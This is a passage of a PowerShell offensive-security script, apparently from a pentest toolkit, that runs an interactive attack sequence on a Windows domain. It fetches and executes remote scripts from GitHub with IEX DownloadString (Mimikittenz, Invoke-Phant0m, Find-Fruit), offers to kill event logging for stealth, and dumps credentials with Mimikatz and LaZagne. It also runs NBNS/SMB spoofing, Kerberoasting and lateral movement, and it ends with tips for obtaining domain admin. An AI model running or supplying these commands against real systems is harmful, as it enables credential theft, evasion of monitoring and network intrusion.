            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
            dependencychecks
            if (isadmin)
            {
                $stealth = Read-Host -Prompt 'Kill event Logs for stealth? (yes/no)'
                if ($stealth -eq "yes" -or $stealth -eq "y" -or $stealth -eq "Yes" -or $stealth -eq "Y")
                {
                    Write-Host -ForegroundColor Yellow 'Killing Event Log Services:'
                    Invoke-Phant0m
                }
            }
    
    
            $inveigh = Read-Host -Prompt 'Do you want to use inveigh for NBNS/SMB/HTTPS Spoofing parallel to this script? (yes/no)'
            if ($inveigh -eq "yes" -or $inveigh -eq "y" -or $inveigh -eq "Yes" -or $inveigh -eq "Y")
            {
                Inveigh
            }
    
            
    
            if (isadmin)
            {
                $Mimidump = Read-Host -Prompt 'You are local Administrator. Do you want to dump local Passwords with Invoke-Mimikatz? (yes/no)'
                if ($Mimidump -eq "yes" -or $Mimidump -eq "y" -or $Mimidump -eq "Yes" -or $Mimidump -eq "Y")
                {
                    Mimikatzlocal
                }
                else{Write-Host -ForegroundColor Yellow 'Boring...'}
            }
    
            $localRecon = Read-Host -Prompt 'Do you want to use local recon scripts? (yes/no)'
            if ($localRecon -eq "yes" -or $localRecon -eq "y" -or $localRecon -eq "Yes" -or $localRecon -eq "Y")
            {
                #Local Reconning
                localreconmodules
            }
    
            $domainRecon = Read-Host -Prompt 'Do you want to use domain recon scripts? (yes/no)'
            if ($domainRecon -eq "yes" -or $domainRecon -eq "y" -or $domainRecon -eq "Yes" -or $domainRecon -eq "Y")
            {
                domainreconmodules
            }
    
            $privesc = Read-Host -Prompt 'Do you want to search for possible privilege escalation vectors? (yes/no)'
            if ($privesc -eq "yes" -or $privesc -eq "y" -or $privesc -eq "Yes" -or $privesc -eq "Y")
            {
                privescmodules
            }
    
            #Lazagne
            $Lazagne = Read-Host -Prompt 'Do you want to extract local Passwords with Lazagne? (yes/no)'
            if ($Lazagne -eq "yes" -or $Lazagne -eq "y" -or $Lazagne -eq "Yes" -or $Lazagne -eq "Y")
            {
                lazagnemodule 
            }
            
            $kerberoasting = Read-Host -Prompt 'Do you want to use Kerberoasting technique to crack function user Hashes? (yes/no)'
            if ($kerberoasting -eq "yes" -or $kerberoasting -eq "y" -or $kerberoasting -eq "Yes" -or $kerberoasting -eq "Y")
            {
                kerberoasting
            }


            $mimikitt = Read-Host -Prompt 'Do you want to use mimikittenz for password extraction? (yes/no)'
            if ($mimikitt -eq "yes" -or $mimikitt -eq "y" -or $mimikitt -eq "Yes" -or $mimikitt -eq "Y")
            {
                #Exploitation Phase
                Write-Host -ForegroundColor Red 'Mimikittenz, output saved to .\Exploitation\Mimikittenz.txt:'
                Invoke-Mimikittenz >> $currentPath\Exploitation\Mimikittenz.txt
            }
    
            $latmov = Read-Host -Prompt 'Do you want to move laterally - recommended for internal assesments? (yes/no)'
            if ($latmov -eq "yes" -or $latmov -eq "y" -or $latmov -eq "Yes" -or $latmov -eq "Y")
            {
                #Lateral Movement Phase
                latmov
            }
    
            #FindFruit
            $fruit = Read-Host -Prompt 'Do you want to search for possible weak Web Applications in the network? (yes/no)'
            if ($fruit -eq "yes" -or $fruit -eq "y" -or $fruit -eq "Yes" -or $fruit -eq "Y")
            {
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
            }
    
            #Share Enumeration
            $shares = Read-Host -Prompt 'Do you want to search for sensitive Files / Find Shares on the network? (yes/no) (This may take long time)'
            if ($shares -eq "yes" -or $shares -eq "y" -or $shares -eq "Yes" -or $shares -eq "Y")
            {
                sharenumeration
            }
    
            #RDP Access
            $rdp = Read-Host -Prompt 'Do you want to search for Systems you have RDP/Admin-Access to? (yes/no)'
            while ($rdp -eq "yes" -or $rdp -eq "y" -or $rdp -eq "Yes" -or $rdp -eq "Y")
            {
               groupsearch
            }
    
            #End
            Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Also try Responder/Inveigh and SMB-Relaying!'
    
    }
}
